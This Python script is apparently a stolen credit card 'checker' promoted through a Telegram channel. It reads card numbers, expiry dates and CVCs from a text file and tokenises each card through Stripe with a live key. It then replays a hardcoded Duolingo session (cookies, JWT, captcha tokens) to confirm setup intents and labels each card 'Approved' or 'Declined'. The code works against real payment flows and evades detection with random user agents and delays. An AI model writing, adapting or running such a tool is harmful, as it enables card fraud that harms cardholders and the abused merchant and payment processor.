import requests,time,webbrowser,json,os,sys,re,user_agent,random
from cfonts import render, say
import random,string,user_agent,base64
from fake_useragent import UserAgent
webbrowser.open('https://t.me/ModcaTheLost')
user = user_agent.generate_user_agent()
		
r = requests.session()
	
r.follow_redirects = True
	
r.verify = False


Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
w = '\033[2;37m'
y = '\033[1;34m' 



md1 = '\x1b[1;31m'  # أحمر
md2 = '\x1b[1;32m'  # أخضر
md3 = '\x1b[38;5;153m'
a5 = '\x1b[38;5;208m'
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
B = "\033[1;30m"  # Black
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
Bl = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White
PN = "\033[1;35m"  # PINK

import sys,time,os
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
os.system('clear')            
from cfonts import render  
#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
output = render('MODCA', colors=['white', 'magenta'], align='center')
print(output)
print("      ~ Pяσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q | Cнαиияℓ : @ModcaTheLost ~")
print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")
print('\n')

pk = "pk_live_vXV6AlRsL8IA7Wmphv6GZpfx"

file=open('Modca.txt',"+r")
#webbrowser.open('https://t.me/ModcaTheLost')
O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple
F = '\033[2;32m'
M = '\x1b[1;37m'

start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    if "20" not in yy:
        yy = f'20{yy}'
    else:
    	yy = yy
    #time.sleep(14)
    headers = {
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-GB;q=0.8,en-AT;q=0.7,en;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'priority': 'u=1, i',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=EG&pasted_fields=number&payment_user_agent=stripe.js%2Fd991d0758e%3B+stripe-js-v3%2Fd991d0758e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.duolingo.com&time_on_page=55497&client_attribution_metadata[client_session_id]=f32b4fc4-bfef-444d-90b3-ce411a8ac67e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=d6fa57b6-1bba-4f44-8490-861f89b7b7c3&muid=2a2e2cab-e8f0-47c1-9f56-e92457432b8e&sid=9bbd8a6e-ff50-4527-abad-56bf1d843521&key=pk_live_wGV2ziRFq7KJLNaVUAJgrzDf&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZWNoJxddxb4-ZCUo2b3172r2VVSlQYwTcrP_VZdE2AnhKaYftGgXfFgCloDnC92y8sPABLqzIekImVcjQHRbJKyOCIJx8LwOb1Ea71bdqdCblB3JXbnR1x2b9Y1zmFIxgAUKI0iBRDAdAL_Kpc_JOIoF6-ehX5FF5pmRcV22obz0XftCqZMYqwsoqQouJSFtpNyAW4LWMATFX6KrTnDsegLUOlHQytRDNa2wqmFA9VG7b-dIL1ySi-7ojhn0Wr3xmsjTGqYEdZl3qDJ2Ij-ywwr6VH-AflouVXd5FiqUHeWbPcmbrTC8EmSngGpnXfV7hDHf4a3NMVebeU-ARngDJZI-fCuCUOzcKBaAqiRg0FI86yFNi0UhRpvzHbAqx3ij2DyDKw_mvP3DKgwYDrlf2gsA8_f82TdJTaC64R_35l8vLmYPDLEypZOzl-Rxh0tcXO6TQ0O9IWp0mOYs_Ml9d8lpmi8tEHSbgAT7DOuJtKWggTM6XlWtryokYgx3V1jz-QqAwOH5be11cGGLb2c6Pcq_bQM1OevKdXG3MRHU2u7seOSD0j8eREGNMTnymeyLBdQS4K_JEKZUpx91UeXANa1agYxVrGgBtGdj9A3ACkxC5PCLLO-NK0GikXbxnqj2Tbgsibfh4nYYYCjpkQaEEjJ3YzoGvPawvwUwl4uYLf1v-wesHrLgYLrfF6UCO9gycd7QkaKtvbuGq8V2qPF5tjIhssd55SbSKNRTIRMMd3cqi3Qu1WbtiQyo9w9lTmX-xL7g1aW3MiyBTMtDVhBt7EQSuohqx3s3g-JAhTQxlsEJZ3yPGqJ1AocesRvb5tencVy0AYxfGk_2K2-aky_eg1q5l5Y2QeISM3DesAl1Wny24y6tALjp1K8nHxFy_IKxZTvwn_cyJQm41yYK17h_SGNJ2c32myTW6aHvBlyUGYIj2jCLQU8afHZ3eCV6KgUtYm-bA_15hbeIh1k0RCOzoPGpnFKny444Jqg4Ct8Dqq65Et_rGOyKJG1xknKWvLj3AwfWOL_tkQ5WRc4v-g1Nsy5i7wY_mzczTbUCCjVOjJvXKRtIex1BzkNluyPswyHY4-vVpUJeWJSW0dyEOxA8vfyiFX6KVwV8ca24DVsCoHeZuWafL3wDM3N3Me6YVi6RJxb_zXxOS7JviEtUTbUT7oytmuptrlQmMaJ23If0ypRuhztv8ErPjWO55gCCmjikyF4fpuqViJrVTIEl3kLYTdR8nKjMz4ICmewUei5bqrVYDqy7Eg8tfWaSGvwtRH6Ko9-iF4b6jRbQelMCK_G_jXjUbZ1qC3pg95Vh1hu7Zt2HTBitfrMEzOIYQsAxI6QPXWO3htS6ef8ugdq1lrFh0VzqU2C6Pr55sAK_kdiBcBKg5cSnXRKE43KJt4c29o5dqk_KubgeZTy4VXmCxzPBL26vrg_DDa0dYLiSUSyQrBrKCL_cyg10fYyOz1NmZ4AXgFX-9SH9PCgkyi00oeW6E1vlawVPM7JzO86PCBuX45RvY5ABiFesj9JkPXk-Ov9qzoVqTHCPkpA0WfJr_6E_gFipUI6hHNPbmWSaMPheoCKJXot6rwnr0FBwIOA2sfx3F_Gp6ovmBMGX_3pCWnhTTQCUiaVW4v8YI32-B_dGW9RTG6v5l4K2MJ3wpCydOlu0ZWAQEb2v-t_WIZxwTIyxAqQq5FVTZXZKYfuksjm80fqDDp1Zva40XbNX8I340Z0aN0EffsaNiL-YVKp_B6wuZY2ekeL5N7Ib1lkvpIAnJ8baAViMhUQ-P8hLau2Lf5pKJIsQ2c-_zVtPuHgVYH74KrEUjWh6HODSw_BKPNVTafa-pc5Cb8s5U8mraHkmv3vwgYdGqceo7Tqn1EiBARS57aQagPbaprULcvYcIESOWqPOI0I_xeHPY72caANlkNGP-ymsn9xBgsp4SnPwEU_jpkeGF7WeNa_h_6WHkg4NuCDZO_qa22nmTpDKkU7zro1KpHA0o5E8jkNapad0S6U_M6LO-k7X_W1KSdzowwhtLdUTzGfXQQLTUM7Z4FgiobQ4K43S4xNBxVVWtW0-FCFTvazEQwXLBQ0BHr56a2gbXcM74Al1O4rQL7-bHy76sUW46mQxsk1dtUMdxFM-gSKNQlukFTEOAxawLbgrCvguzX0ChW13yrGZGjZXhwzmZ5W32oc2hhcmRfaWTOAzGDb6Jrcqg0NmIyNjRlY6JwZAA.vSuTtYMgkNR-us8RgEBdfgA-yINHhlXV4IuZ8n16lPY'
	
    res = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
    try:
	    id = res.json()['id']
    except:
	     id = "CARD NONE"
	     print(id)
	
    cookies = {
	    'lang': 'ar',
	    'duocsexp3': 'course_splash_redesign~experiment~',
	    'lu': 'https://ar.duolingo.com/',
	    'initial_referrer': 'https://www.google.com/',
	    'lp': 'splash',
	    '_fbp': 'fb.1.1719226725034.139781842500705876',
	    '_gid': 'GA1.2.752643548.1719226725',
	    '_gcl_au': '1.1.1709079915.1719226725',
	    'lr': '',
	    'logged_in': 'true',
	    'wuuid': '1c2c37e5-1ebc-4e92-b8db-d6e0ccdf6f88',
	    '_ga_JZZTR9QZPD': 'GS1.1.1719228943.2.1.1719228956.0.0.0',
	    'g_state': '{"i_l":0}',
	    'csrf_token': 'IjIwNzIzNjQwYzExYTQ1MDhiMWNjMmEzNjkyNjZhZGZkIg==',
	    'logged_out_uuid': '1338342912',
	    'jwt_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMzM4MzQyOTEyfQ.VdLH8coXla_nUCvQJmnRtJfXvN_PLmhFigk7iJtcAV0',
	    'tsl': '1719228970915',
	    'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Jun+24+2024+14%3A36%3A11+GMT%2B0300+(Eastern+European+Summer+Time)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=852bc9ff-db42-4305-9ca5-92f2397e76d9&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false',
	    '_ga': 'GA1.2.239153438.1719226725',
	    '__gads': 'ID=64f47b2a12901855:T=1719229142:RT=1719229142:S=ALNI_Ma9TFa8Qp-FsYesz1qI_-tDOzxmCg',
	    '__gpi': 'UID=00000e592afaa05c:T=1719229142:RT=1719229142:S=ALNI_MaNeolF3CBLFCvVHEVTz6ZsBGsoXg',
	    '__eoi': 'ID=6bfd5ff7cc9ff43a:T=1719229142:RT=1719229142:S=AA-Afjbf8h2iBAjp0mP1hy-LNteo',
	    '_ga_CSFDVCPQ4F': 'GS1.1.1719228947.2.1.1719229150.50.0.0',
	    'AWSALB': 'vp2XSbA6Ni6f0sd8sXsqRaj2zXjBK7WHuGqdw6Ph0C7rp9q237bweCGuSLxpqoM7Wdi43F4xEZt5rrpbecuheoGTH8kjS11S6JrlLq1p+mc3l1ZboZId1sVXLSLQ',
	    'AWSALBCORS': 'vp2XSbA6Ni6f0sd8sXsqRaj2zXjBK7WHuGqdw6Ph0C7rp9q237bweCGuSLxpqoM7Wdi43F4xEZt5rrpbecuheoGTH8kjS11S6JrlLq1p+mc3l1ZboZId1sVXLSLQ',
	}
	
    headers = {
	    'accept': 'application/json; charset=UTF-8',
	    'accept-language': 'ar-EG,ar;q=0.9,en-GB;q=0.8,en-AT;q=0.7,en;q=0.6,en-US;q=0.5',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMzM4MzQyOTEyfQ.VdLH8coXla_nUCvQJmnRtJfXvN_PLmhFigk7iJtcAV0',
	    'content-type': 'application/json; charset=UTF-8',
	    'idempotency-key': id,
	    'origin': 'https://www.duolingo.com',
	    'priority': 'u=1, i',
	    'referer': 'https://www.duolingo.com/shop',
	    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-amzn-trace-id': 'User=1338342912',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
    json_data = {
	    'paymentMethodId': id,
	    'product': 'DUOLINGO',
	}
	
    req = requests.post(
	    'https://www.duolingo.com/2017-06-30/users/1338342912/create-setup',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	
    try:
       key = req.json()['clientSecret']
       Dod = key.split('_secret')[0]
    except:
       key=None
       Dod=None
	
    headers = {
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-GB;q=0.8,en-AT;q=0.7,en;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'priority': 'u=1, i',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
    data = f'return_url=https%3A%2F%2Fwww.duolingo.com%2Fshop&payment_method={id}&expected_payment_method_type=card&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZW6I1L7ebd4tKAJ5UzKsLa81E5mGSzzZSIqpOwCpm05taAGjjUTq3rpmKRyfCo_dqI9ORT3xsNq9f5K_81MA9WzEMmtuwZWiwDJTSnRYjEoN5vaR7tFWQf2Dxgdd81G32KP8ozJgaLfugTFO2MArmQ5RPpWbrJ_AvOwNrSiuPiE-EkX_rxHg308ydxkQfFDmGlm8N2unt1MwV3AGCqsMaKXmXV13xKeYHPYwjuGvaJradMlyXhEuVnRQHZoeVQz9nW6EQo5pWtu8fFOsHiR50qMCQ_J0SecZ9WP7maAy36lSW3jNnNXDhP0-iV2tgiWexeEI7IYg8PqpEaXG62Ds7myLqa7OEhJ2PD5VMjY9PZiuUAsTkTyxFTMmtwZZvgBVrXSo_PoUhwSPAO0TC8aEvGNMJOOigXymdTTe3wxKLlSrKyRhpscOK-4utCW3G0jhBtFO9ywCIrw-lEsoTgRMOBdEyb6domw_G01O2UQi7YgLdWivMzlQQ7b6lze21RwamE69QqX2xKyZ830QWk7fERYRMLWNdFRB4COsHrERIUb7cVrAA_rKMJXHW478_G0vG4ljVpUl_h0lo0-y61UUnagMgZsaW4HD9aX44GspWLR_i35GwKwylz-g_x9qUA1QsAP7mx2sXgMc6A36iSk37E5DzDmxGN1W_SnS4fyl0LGWYVFmGF0_lyZsSeodz131VnzkvkZn_0h2uC8DXkPTDfGPA9JfvXxm0ulwmbe6ypZ3Zgn_7LV1ZRoTh-xURtmfEnUe-cfcQipbJPEsajp6Ykiq4lEWMGDBxZXZgbCesAZYKxPi5VlvH0qbtylVS33bUXY_vzuNOExNE1BlLVX_ub-1S1FbuTpxIWNtJ7H1llt1ZVgMQ0Bd5VLqwug5F8_hd3gj5E1n0958OK_QCfCJt4oZF7GflUBwK-eBUGa9SwZhgmDF8Fa6h6pZqLjYz-QGvU6ReqO8t1UJSUSra2iqEOLqv4LgeeOzU1aiCBLhwLRCZ2B646RkU2MuFnlgsl9PXI4R5cBbgHrUSX6yGrdpFk7mtBMa4zLsWeqWYQ00nZ99LgI4ZdX9zazVoQnfz3UFUgQuGVCS9hdTNo0HyGpVnx7HbgSStp9Q8MB0GCdkseFYJluLJThDNKPicB8e-o8gH5EYmcTNSqpCp-JeJSuSqFr9m4q46Bo7ahl6G76-uZwYN3_AOc7eoWg43bHu4PjJN9MIruauZksl93bqgdbIQNvnFjGkGKWcdAm5kW3_7krDnkDld8pyYHxeXKm1wc9OGGrp_dVmVGUcixXsGc75XxfpxR6VWKh0Y8VPu_VHdOsHzbftDyj5kwHoD1ZVI8M35xiCU0pv_KZpzV_Zcn6irdW5O9-AR3hf1bcCEfrLDoHU7Jx73Bv4g3XmQd3fkTPFGpC_YdpmJrmyGtrbx8NclfCEZXMhjtABEPTYys-YAKQzmOt9y_Pp6DIT_mrgaoCZAY_cLSbOL-KQUB0_rEMWkHh4MINmiaA4EoDMHNkdeRxs9C_blLc8BHYoiLJRV5SXFyzLsCB4JB6FHpRBHZJ7b0LHiKn4PV3S32tkEKdoheK6t0YkOAH8Em8ORuuTSwPnY7Tiu5lvjRvryVCs4gH_alsPlkvy9C9rGYLfQgAoIkVKMz3lAj4Eisqh7jjHArhXogPBFUWVDSeuMR8lnhwdRPuckSkAJ2iQ6a31Uuc5KFM7JLoPcQDCA9n3Le2E7YiwTqxIahM6AuUZIxYpuiGEu1rjGuDUVm669gyiwJ-ZYvM3503R7pQsVZYzMJxy9FmGzM06wi-ol-gwyOTkatdgY3pHl1Tiyr0iGd4W5jGafh4tyVtM2PZKMfIZC7ww1dXQE7DXA1TPErbz6awIBvmFMrZVCk1IfwzTP_QrfC80330TN-g5tvZqWKXk71JC2as8xuTGRm4_GuAeosnv64weNY0A3XlDVOIzuzZ-3apnfcGQyaGOiVtbo6yX7zpWPka1g6TP4l3f21QteezW0fYE0bSJF47DMXVydkRWSlMEy2IgKffIKNQ8YWietAbprQJc2GI0CqM58ZCqif1mh2VHd2D60mCJSY4cgLRjZ3d2vKBHZ-9gIlLwoeeR0H-VLHzvGj1yDr_UrPKyq5bW8i6FQw1v7dFiBaHXutpmxsZUKPlkh6iymtGo-jZXhwzmZ5W5moc2hhcmRfaWTOAzGDb6JrcqgzODQ2OTRkMKJwZAA.tJmeh0ndjpqmytgU3tQu97FZBTR6n34dXq5QhKwKzdc&use_stripe_sdk=true&key=pk_live_wGV2ziRFq7KJLNaVUAJgrzDf&client_secret={key}'
	
    response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{Dod}/confirm',
	    headers=headers,
	    data=data,
	)
    modca=(response.text)
    if 'succeeded' in modca:
	    print(f'[ {start_num} ]',P,' ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ✅ ')
    else:
	    print(f'[ {start_num} ]',P,' ➜ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')
    time.sleep(15)